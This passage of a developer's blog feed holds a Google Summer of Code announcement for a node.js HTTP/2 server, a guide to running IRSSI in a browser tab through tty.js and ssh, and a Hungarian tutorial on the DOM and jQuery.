    <id>http://gabor.molnar.es/blog/2013/06/11/google-summer-of-code</id>
    <content type="html"><![CDATA[<p>It’s just a quick post to say hello to everybody who plans to follow my Google Summer of Code project,
which is about implementing a HTTP/2 prototype server in node.js. I will blog about it weekly to keep
you informed.</p>

<p>The information page of the project on the GSoC2013 website is <a href="https://google-melange.appspot.com/gsoc/project/google/gsoc2013/molnarg/5001">this</a>. I will be happy
to email you the full proposal if you are interested, but I don’t want to share it publicly since
it contains personal information.</p>

<p>The project is <a href="https://github.com/molnarg/node-http2">hosted on GitHub</a>, and will be available as an <a href="https://npmjs.org/package/http2">npm module</a>.</p>

<p>The Atom feed of my GSoC related blog posts is <a href="http://gabor.molnar.es/blog/categories/google-summer-of-code/atom.xml">this</a>.</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Biztonságos programozás Rust nyelven]]></title>
    <link href="http://gabor.molnar.es/blog/2013/06/08/biztonsagos-programozas-rust-nyelven/"/>
    <updated>2013-06-08T22:25:00+02:00</updated>
    <id>http://gabor.molnar.es/blog/2013/06/08/biztonsagos-programozas-rust-nyelven</id>
    <content type="html"><![CDATA[<p>Tegnap ebben a témában adtam elő. A slide-ok <a href="http://gabor.molnar.es/slides/rust-security/">itt elérhetőek</a>.</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[IRSSI in the browser]]></title>
    <link href="http://gabor.molnar.es/blog/2013/06/02/irssi-in-the-browser/"/>
    <updated>2013-06-02T21:31:00+02:00</updated>
    <id>http://gabor.molnar.es/blog/2013/06/02/irssi-in-the-browser</id>
    <content type="html"><![CDATA[<p><img src="http://gabor.molnar.es/images/irssi-in-the-browser.png" style="width: 100%;" /></p>

<p>This is a quick guide to using the <a href="http://irssi.org/">IRSSI</a> IRC client in a permanent browser tab. It is made possible by <a href="https://github.com/chjj/tty.js/">tty.js</a>, a great node.js based project that makes the command line accessible in the browser (using a lightweight webserver). A basic setup with IRSSI running on the local machine is quite easy, but it gets a little tricky if you happen to run IRSSI on a server to stay connected all the time. If you run IRSSI on a remote server and want to see it in a browser tab, then this guide is for you.</p>

<!-- more -->

<h2 id="start-irssi-on-the-server-in-screen">Start IRSSI on the server in screen</h2>

<p>First of all, IRSSI has to be running on the server in a detached screen:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
</pre></td><td class="code"><pre><code class="bash"><span class="line"><span class="nv">$ </span>screen -d -m -S irc irssi
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p><code>-d -m</code> makes screen start detached and <code>-S irc</code> gives the name <code>irc</code> to the session.</p>

<h2 id="set-up-ttyjs">Set up tty.js</h2>

<p>On your local machine, you will need to have tty.js installed. It runs on <a href="http://nodejs.org/">node.js</a>, so if you don’t have it installed yet, you can download it from <a href="http://www.nodejs.org/download/">here</a>, or install it using the package manager of your linux distribution.</p>

<p>Once you have node.js installed, installing tty.js goes like this:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
</pre></td><td class="code"><pre><code class="bash"><span class="line"><span class="nv">$ </span>sudo npm install -g tty.js
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>The config file of tty.js is located at <code>~/.tty.js/config.json</code>. Put these lines in the config:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
</pre></td><td class="code"><pre><code class="json"><span class="line"><span class="p">{</span>
</span><span class="line">  <span class="nt">&quot;localOnly&quot;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
</span><span class="line">  <span class="nt">&quot;port&quot;</span><span class="p">:</span> <span class="mi">8080</span><span class="p">,</span>
</span><span class="line">  <span class="nt">&quot;shell&quot;</span><span class="p">:</span> <span class="s2">&quot;ssh&quot;</span><span class="p">,</span>
</span><span class="line">  <span class="nt">&quot;shellArgs&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;-t&quot;</span><span class="p">,</span> <span class="s2">&quot;user@yourserver.com&quot;</span><span class="p">,</span> <span class="s2">&quot;screen -r irc&quot;</span><span class="p">]</span>
</span><span class="line"><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Short explanation:</p>

<ul>
  <li><code>"localOnly": true</code>: listen on the loopback interface (so that it won’t be accessible over the network)</li>
  <li><code>"port": 8080</code>: run on the 8080 port</li>
  <li><code>"shell": "ssh"</code>: use <code>ssh</code> instead of a standard terminal</li>
  <li><code>"shellArgs": ["-t", "user@yourserver.com", "screen -r irc"]</code>: connect to the server and attach to the screen session named <code>irc</code></li>
</ul>

<p>Now you can start it with the <code>tty.js</code> command. To test it, open <a href="http://localhost:8080">localhost:8080</a> in your browser and click on the “Open Terminal” button. You should see IRSSI running in the opening terminal window.</p>

<h2 id="start-everything-automatically">Start everything automatically</h2>

<p>Add the <code>tty.js</code> command to the autorun list of you window manager (on Gnome, use <code>gnome-session-properties</code>), and use “tab pinning” in your favorite browser to have a permanent IRC tab open.</p>

<p>The only remaining problem is that the “Open Terminal” button have to be clicked when you first switch to the IRC tab. Add these lines to the end of the <code>index.html</code> file of tty.js (which is usually located at <code>/usr/local/lib/node_modules/tty.js/static/index.html</code>):</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
</pre></td><td class="code"><pre><code class="html"><span class="line"><span class="nt">&lt;script&gt;</span>
</span><span class="line">  <span class="nx">tty</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;connect&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
</span><span class="line">    <span class="kd">var</span> <span class="nx">w</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">tty</span><span class="p">.</span><span class="nx">Window</span><span class="p">();</span>
</span><span class="line">    <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span> <span class="nx">w</span><span class="p">.</span><span class="nx">maximize</span><span class="p">();</span> <span class="p">},</span> <span class="mi">200</span><span class="p">);</span>
</span><span class="line">  <span class="p">});</span>
</span><span class="line"><span class="nt">&lt;/script&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>And that’s all :)</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[JavaScript programozás - A jQuery függvénykönyvtár]]></title>
    <link href="http://gabor.molnar.es/blog/2013/05/12/javascript-programozas-jegyzet-a-jquery-fuggvenykonyvtar/"/>
    <updated>2013-05-12T20:16:00+02:00</updated>
    <id>http://gabor.molnar.es/blog/2013/05/12/javascript-programozas-jegyzet-a-jquery-fuggvenykonyvtar</id>
    <content type="html"><![CDATA[<p>A böngésző az oldal betöltésekor beolvassa a HTML fájlt, feldolgozza a stíluslapokat és lefuttatja a hivatkozott szkripteket. Ez azonban csak a kezdet :)</p>

<p>A JavaScript segítségével könnyen interaktívvá tehető egy weboldal. Ehhez két nagyon fontos eszközünk is van:</p>

<ul>
  <li>lehetséges a felhasználó tevékenységeire reagálni (egérkattintás, szöveg beírása, stb)</li>
  <li>meg lehet változtatni a weboldal tartalmát a betöltődés után</li>
</ul>

<p>Ez a két dolog már elég ahhoz, hogy egyszerű webalkalmazásokat készítsünk.</p>

<p>A beépített függvények viszont, amikkel ezeket a funkciókal elérhetjük, nem mindig egyszerűen használhatók, és van, hogy böngészőnként eltérően működnek. Szerencsére több olyan függvénykönyvtár is van, ami leegyszerűsíti a dolgunkat. Az egyik ilyen, nagyon népszerű függvénykönyvtár a <a href="http://jquery.com/">jQuery</a>, ennek a használatát fogom röviden bemutatni.</p>

<!-- more -->

<h2 id="document-object-model">Document Object Model</h2>

<p><strong>A böngésző</strong> a HTML fájl beolvasásakor sorról sorra halad, és <strong>a beolvasott HTML tag-ekből objektumokat hoz létre</strong>. Ezeket az objektumokat <strong>element</strong>-eknek, <strong>elem</strong>eknek vagy <strong>node</strong>-oknak nevezzük, és JavaScript-ből is elérhetőek. Az element objektumoknak olyan metódusai, és tulajdonságai vannak, amiket felhasználva lehetséges az adott element adatait (pl. hol helyezkedik el a képernyőn, stílus adatok, stb.) kiolvasni és módosítani.</p>

<p>Mivel a HTML-ben az egyes tag-eknek lehetnek “gyerekei”, ezért a létrejövő objektumhalmaz is hierarchikusan épül fel. A hierarchia legfelső szintjén a <code>document</code> objektum van, ennek a gyereke a <code>&lt;html&gt;</code> tag-nek megfelelő element, ennek pedig a <code>&lt;head&gt;</code> és <code>&lt;body&gt;</code> tag-eknek megfelelő objektumok, stb.</p>

<p><strong>Ezt a hierarchikus szerkezetet nevezzük Document Object Model (DOM) fának.</strong></p>

<p>Két jellemző tulajdonság, amivel minden element rendelkezik:</p>

<ul>
  <li><code>nodeName</code>: az adott element típusát tároló sztring (legtöbbször a tag neve csupa nagybetűvel, pl. <code>"HEAD"</code>, <code>"BODY"</code>, <code>"P"</code>)</li>
  <li><code>childNodes</code>: az adott element “gyerekeit” tároló tömb, aminek elemei szintén element-ek</li>
</ul>

<p>Ezen kívül nagyon sok más tulajdonsággal rendelkezik minden element, de ezekkel egyelőre nem foglalkozunk.</p>

<h2 id="dom-plda">DOM példa</h2>

<p>Egy rövid példán keresztül mutatom be, hogy egy HTML kódból milyen DOM fa jön létre. A példában az elementeknél csak a <code>nodeName</code> és a <code>childNodes</code> tulajdonságot írtam le, a többit kihagytam. A bal oldalon a HTML, a jobb oldalon a belőle létrejövő (egyszerűsített) DOM fa látható:</p>

<div style="float: left; width: 48%">
<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
</pre></td><td class="code"><pre><code class="html"><span class="line"><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span><span class="line"><span class="nt">&lt;html&gt;</span>
</span><span class="line">  <span class="nt">&lt;head&gt;</span>
</span><span class="line">  <span class="nt">&lt;/head&gt;</span>
</span><span class="line">  <span class="nt">&lt;body&gt;</span>
</span><span class="line">    <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">&quot;negyzet&quot;</span>
</span><span class="line">         <span class="na">style=</span><span class="s">&quot;width: 100px;</span>
</span><span class="line"><span class="s">                height: 100px;</span>
</span><span class="line"><span class="s">                background-color: black;&quot;</span>
</span><span class="line">    <span class="nt">&gt;&lt;/div&gt;</span>
</span><span class="line">  <span class="nt">&lt;body&gt;</span>
</span><span class="line"><span class="nt">&lt;/html&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>
</div>
<div style="float: right; width: 48%">
<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
</pre></td><td class="code"><pre><code class="javascript"><span class="line"><span class="kd">var</span> <span class="nb">document</span> <span class="o">=</span> <span class="p">{</span>
</span><span class="line">  <span class="nx">nodeName</span><span class="o">:</span> <span class="s1">&#39;#document&#39;</span><span class="p">,</span>
</span><span class="line">  <span class="nx">childNodes</span><span class="o">:</span> <span class="p">[{</span>
</span><span class="line">    <span class="nx">nodeName</span><span class="o">:</span> <span class="s1">&#39;HTML&#39;</span><span class="p">,</span>
</span><span class="line">    <span class="nx">childNodes</span><span class="o">:</span> <span class="p">[{</span>
</span><span class="line">      <span class="nx">nodeName</span><span class="o">:</span> <span class="s1">&#39;HEAD&#39;</span><span class="p">,</span>
</span><span class="line">      <span class="nx">childNodes</span><span class="o">:</span> <span class="p">[]</span>
</span><span class="line">    <span class="p">},</span> <span class="p">{</span>
</span><span class="line">      <span class="nx">nodeName</span><span class="o">:</span> <span class="s1">&#39;BODY&#39;</span><span class="p">,</span>
</span><span class="line">      <span class="nx">childNodes</span><span class="o">:</span> <span class="p">[{</span>
</span><span class="line">        <span class="nx">id</span><span class="o">:</span> <span class="s1">&#39;negyzet&#39;</span><span class="p">,</span>
</span><span class="line">        <span class="nx">nodeName</span><span class="o">:</span> <span class="s1">&#39;DIV&#39;</span><span class="p">,</span>
</span><span class="line">        <span class="nx">childNodes</span><span class="o">:</span> <span class="p">[]</span>
</span><span class="line">      <span class="p">}]</span>
</span><span class="line">    <span class="p">}]</span>
</span><span class="line">  <span class="p">}]</span>
</span><span class="line"><span class="p">};</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>
</div>
<div style="clear: both"></div>

<p>A fenti HTML kód egy fekete színű négyzetet jelenít meg, aminek az <code>id</code> attribútuma <code>negyzet</code>:</p>

<div id="negyzet" style="width: 100px;
            height: 100px;
            background-color: black;"></div>
<p />

<p>Most változtassuk meg a négyzet színét! A lenti kódrészletet akár a konzolban (CTRL+SHIFT+J) is ki lehet próbálni ezen az oldalon:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
</pre></td><td class="code"><pre><code class="javascript"><span class="line"><span class="kd">var</span> <span class="nx">negyzet_element</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;negyzet&#39;</span><span class="p">);</span> <span class="c1">// A &quot;négyzet&quot; element lekérdezése id alapján</span>
</span><span class="line"><span class="nx">negyzet_element</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">backgroundColor</span> <span class="o">=</span> <span class="s1">&#39;green&#39;</span><span class="p">;</span>          <span class="c1">// Háttérszín beállítása</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<h2 id="a-jquery-fggvnyknyvtr">A jQuery függvénykönyvtár</h2>

<p>Az előző kódrészletet nem magyaráztam el részletesen, mert olyan DOM függvényeket, tulajdonságokat használtunk, amikre később nem lesz szükségünk. A DOM-ról általánosságban elmondható, hogy elég bonyolult használni, és mindenre speciális függvények, objektum tulajdonságok vannak, amiket mindig a dokumentációban kell megnézni, mert nehezen megjegyezhetők.</p>

<p>Ehelyett a <strong>jQuery</strong> függvénykönyvtárat fogjuk használni, ami megoldja helyettünk a DOM kezelését, és <strong>egyszerűen használható, ha értünk a CSS-hez</strong>. A DOM bevezetésre azért volt szükség, hogy lássuk, a jQuery nem varázslat, hanem olyan dolgokat könnyít meg, amit mi is meg tudnánk csinálni, csak körülményesen.</p>

<p>A jQuery-t könnyen be lehet tölteni egy szkript tag segítségével:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
</pre></td><td class="code"><pre><code class="html"><span class="line"><span class="nt">&lt;script </span><span class="na">src=</span><span class="s">&quot;http://code.jquery.com/jquery-1.9.1.min.js&quot;</span><span class="nt">&gt;&lt;/script&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>A betöltött szkript egyetlen függvény típusú globális változót hoz létre, aminek a neve <code>$</code> (dollárjel).</p>

<h2 id="elementek-kivlasztsa">Elementek kiválasztása</h2>

<p>A jQuery-nél egy-egy művelet elvégzése (pl. a négyzet színét változtassuk meg zöldre) mindig két részre osztható:</p>

<ol>
  <li><strong>kiválasztjuk</strong> azokat <strong>az elementeket</strong>, amiken a módosítást el akarjuk végezni (pl. a “negyzet” id-vel rendelkező element)</li>
  <li>a kiválasztott elementeken valamilyen metódus segítségével <strong>elvégezzük a módosítást</strong> (pl. a kiválasztott elementek színét megváltoztatjuk zöldre)</li>
</ol>

<p>Elementeket kiválasztani <a href="http://patrik.what.hu/web/css.html#chapter2">CSS szelektor kifejezések</a> segítségével lehet. Emlékeztetőül néhány egyszerű CSS szelektor kifejezés:</p>

<ul>
  <li><code>#azonosito</code>: azt az egy elementet választja ki, aminek az <code>id</code> attribútuma <code>azonosito</code></li>
  <li><code>.osztaly</code>: azokat az elementeket választja ki, amiknek a <code>class</code> attribútumában szerepel az <code>osztaly</code> (a class attribútumban szóközzel elválasztva több különböző osztálynév is szerepelhet)</li>
  <li><code>div</code>: kiválasztja az összes div típusú element-et</li>
</ul>

<p>Ha megvan a szelektor kifejezés, akkor ezt sztringként kell átadni a <code>$</code> függvénynek, az pedig visszaad egy objektumot (nevezzük ezt <em>jQuery objektumnak</em>), ami a kiválasztott elementeket tartalmazza. Később ezen az objektumon keresztül lehet majd a különféle műveleteket elvégezni.</p>

<p>Néhány példa kiválasztásra:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
</pre></td><td class="code"><pre><code class="javascript"><span class="line"><span class="kd">var</span> <span class="nx">negyzet</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#negyzet&#39;</span><span class="p">);</span>  <span class="c1">// a &quot;negyzet&quot; id-vel rendelkező element</span>
</span><span class="line"><span class="kd">var</span> <span class="nx">kodsorok</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;.line&#39;</span><span class="p">);</span>    <span class="c1">// a &quot;line&quot; class-ba tartozó elementek</span>
</span><span class="line"><span class="kd">var</span> <span class="nx">bekezdesek</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;p&#39;</span><span class="p">);</span>      <span class="c1">// az összes &quot;p&quot; típusú element (vagyis a bekezdések)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<h2 id="css-tulajdonsgok-mdostsa">CSS tulajdonságok módosítása</h2>

<p>Ha megvan a kiválasztás, a visszakapott jQuery objektumon a <code>.css(nev, ertek)</code> metódust meghívva állíthatunk be stílus tulajdonságokat. Ahogy stíluslapok szerkesztésekor, itt is a stílus szabály nevét, és a hozzá tartozó értéket kell megadni.</p>

<p>A négyzet háttérszínét tehát így lehet átállítani (a konzolban ki lehet próbálni ezen az oldalon, a fenti négyzet színét fogja átállítani!):</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
</pre></td><td class="code"><pre><code class="javascript"><span class="line"><span class="kd">var</span> <span class="nx">negyzet</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#negyzet&#39;</span><span class="p">);</span>            <span class="c1">// a &quot;negyzet&quot; id-vel rendelkező element kiválasztása</span>
</span><span class="line"><span class="nx">negyzet</span><span class="p">.</span><span class="nx">css</span><span class="p">(</span><span class="s1">&#39;background-color&#39;</span><span class="p">,</span> <span class="s1">&#39;red&#39;</span><span class="p">);</span> <span class="c1">// a kiválasztott element(ek) háttérszínének átállítása vörösre</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Azt nem kell tudnunk előre, hogy a kiválasztás hány elementet ad vissza. Ha a kiválasztásban egyszerre több element szerepel, akkor egyszerre mindegyiken végzünk műveleteket, ha pedig nem szerepel egy element sem, akkor nem történik semmi.</p>

<p>A következő két példa közül az első az összes bekezdés betűszínét megváltoztatja, a második viszont nem csinál semmit, mert nincs olyan element, amire illeszkedne a megadott kiválasztó kifejezés:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
</pre></td><td class="code"><pre><code class="javascript"><span class="line"><span class="kd">var</span> <span class="nx">bekezdesek</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;p&#39;</span><span class="p">);</span>          <span class="c1">// a &quot;p&quot; típusú element(ek) kiválasztása</span>
</span><span class="line"><span class="nx">bekezdesek</span><span class="p">.</span><span class="nx">css</span><span class="p">(</span><span class="s1">&#39;color&#39;</span><span class="p">,</span> <span class="s1">&#39;blue&#39;</span><span class="p">);</span>  <span class="c1">// a kiválasztott element(ek) betűszínének átállítása kékre</span>
</span><span class="line">
</span><span class="line"><span class="kd">var</span> <span class="nx">ures_kivalasztas</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;.nemletezo&#39;</span><span class="p">);</span> <span class="c1">// a &quot;nemletezo&quot; osztályú element(ek) kiválasztása</span>
</span><span class="line"><span class="nx">ures_kivalasztas</span><span class="p">.</span><span class="nx">css</span><span class="p">(</span><span class="s1">&#39;color&#39;</span><span class="p">,</span> <span class="s1">&#39;blue&#39;</span><span class="p">);</span>  <span class="c1">// a kiválasztott element(ek) betűszínének átállítása kékre</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<h2 id="esemnyek">Események</h2>

<p>A böngésző a weboldal felhasználójának legtöbb tevékenységét (kattintás, szöveg beírása, stb.) eseményként kezeli. Egy eseményhez mindig hozzá tartozik két fontos tulajdonság (de ezen felül lehet több adata is):</p>

<ul>
  <li>az esemény típusa (pl. kattintás)</li>
  <li>az az element, amin az esemény keletkezik (pl. az az element, amire a felhasználó rákattintott)</li>
</ul>

<p>Az <strong>eseményekre fel lehet iratkozni</strong>, ami úgy zajlik, hogy <strong>megadunk egy függvényt, ami meghívódik, ha az esemény bekövetkezik</strong>. A feliratkozásnál mindig meg kell adni, hogy melyik element milyen típusú eseményeire iratkozunk fel.</p>

<p>A jQuery-ben az <code>.on(esemeny_tipusa, esemenykezelo_fv)</code> metódus használható feliratkozásra, amit azon a jQuery objektumon kell meghívni, amelyiken a várt esemény be fog következni. A két argumentum jelentése:</p>

<ul>
  <li><code>esemeny_tipusa</code>: sztring típusú argumentum, ami az esemény típusát adja meg (pl. ‘click’)</li>
  <li><code>esemenykezelo_fv</code>: függvény típusú argumentum, ami meg fog hívódni az esemény hatására</li>
</ul>

<p>Példa a használatára:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
</pre></td><td class="code"><pre><code class="javascript"><span class="line"><span class="kd">var</span> <span class="nx">negyzet</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#negyzet&#39;</span><span class="p">);</span>
</span><span class="line"><span class="nx">negyzet</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;click&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
</span><span class="line">  <span class="k">if</span> <span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">&lt;</span> <span class="mf">0.5</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="nx">negyzet</span><span class="p">.</span><span class="nx">css</span><span class="p">(</span><span class="s1">&#39;background-color&#39;</span><span class="p">,</span> <span class="s1">&#39;green&#39;</span><span class="p">);</span>
</span><span class="line">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class="line">    <span class="nx">negyzet</span><span class="p">.</span><span class="nx">css</span><span class="p">(</span><span class="s1">&#39;background-color&#39;</span><span class="p">,</span> <span class="s1">&#39;red&#39;</span><span class="p">);</span>
</span><span class="line">  <span class="p">}</span>
</span><span class="line"><span class="p">});</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>A példát érdemes a konzolban kipróbálni. Ez után a fenti négyzet kattintás hatására véletlenszerűen vörös vagy zöld színű lesz.</p>

<h2 id="tovbbi-esemnyek-metdusok">További események, metódusok</h2>

<p>Néhány további gyakran használt esemény típus:</p>

<ul>
  <li><code>mouseenter</code>: az egérkurzor a kiválasztott element felé kerül</li>
  <li><code>mouseleave</code>: az egérkurzor a kiválasztott element területét elhagyja</li>
  <li><code>dblclick</code>: dupla kattintás</li>
  <li><code>change</code>: beviteli mezőkön (<code>&lt;input&gt;</code>) jön létre, ha megváltozik a mező tartalma</li>
</ul>

<p>Egyéb hasznos metódusok jQuery objektumokon egyszerű alkalmazások készítéséhez:</p>

<ul>
  <li><code>.val(ertek)</code>: beviteli mezők (<code>&lt;input&gt;</code>) tartalmának beállítása vagy kiolvasása (ha meg van adva az <code>ertek</code> argumentum, akkor beállít, egyébként kiolvas; <a href="http://api.jquery.com/val/">dokumentáció</a>)</li>
  <li><code>.attr(nev, ertek)</code>: egy HTML attribútum lekérdezése, vagy beállítása (ha meg van adva az <code>ertek</code> argumentum, akkor beállít, egyébként kiolvas; <a href="http://api.jquery.com/attr/">dokumentáció</a>)</li>
  <li><code>.hide()</code>: a kiválasztott elementek elrejtése (<a href="http://api.jquery.com/hide/">dokumentáció</a>)</li>
  <li><code>.show()</code>: a kiválasztott elementek mutatása, ha el voltak rejtve (<a href="http://api.jquery.com/show/">dokumentáció</a>)</li>
</ul>

]]></content>
  </entry>
  
</feed>
